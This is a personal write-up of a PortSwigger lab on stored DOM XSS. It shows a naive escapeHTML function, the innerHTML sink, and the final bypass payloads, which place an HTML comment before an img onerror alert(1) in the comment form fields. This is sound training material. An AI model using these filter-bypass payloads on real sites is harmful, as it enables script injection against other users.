---
title: Stored DOM XSS
layout: default
platform: Portswigger
---

# Preface

[This lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored) took me ~3 hours to solve.

I tried multiple methods to find the suitable payload even crafted it myself.

Including using LLM, but they were failed to base on the vulnerable JavaScript and html input area to craft a specific payload for this room.

# Way of thinking

By knowing this function, you know you can't really use any <tag> payload inside your input area :

```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
	}
```

However, LLM kept forgetting and crafting the payload will get escaped.

I tried to analyze the whole script again and again.

Line by line and function by function.

I pretty much just googled all the function as much as I could to find the acceptable payload but not trying to get myself to see this lab's writeup.

Until I went back to the [Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based) to find hint. And here's what I have found :
"
Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.

```
element.innerHTML = comment.author
```

Which sinks can lead to DOM-XSS vulnerabilities?
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities: 

```
element.innerHTML
```

Again, search exploit for this function and I found [this](https://samy.blog/element.innerhtml-and-xss-payloads) :

Here's the payload may work on my lab

```
<img src='x' onerror='alert(1)'>
```

Then now I had to focus on escaping the attribute. So yes, I went back to review the script again and Ctrl+F all the innerHTML then I know I have to exploit the Website element which suited like this :

```
<input pattern="(http:|https:).+" type="text" name="website">
```

```
<section class="comment"><p><a id="author" href="http://example.com/%0A%0D<script>alert(1)</script>"></a>attacker | 01-11-2024<img class="avatar" src="/resources/images/avatarDefault.svg"></p><p>attacker</p><p></p></section>
```

I knew I had to escape the url and made the ```alert()``` happen. So I review the stored source again. And I suddenly remember it was a html. I could use html comment ```<!--- ---!>``` to escape it and that's the payload :

```
- name     : <!--- ---!><img src='x' onerror='alert(1)'>
- comment  : <!--- ---!><img src='x' onerror='alert(1)'>
- website  : http://example.com/<!--- ---!><img src='x' onerror='alert(1)'>
```  

Successfully escaped and finish the lab.
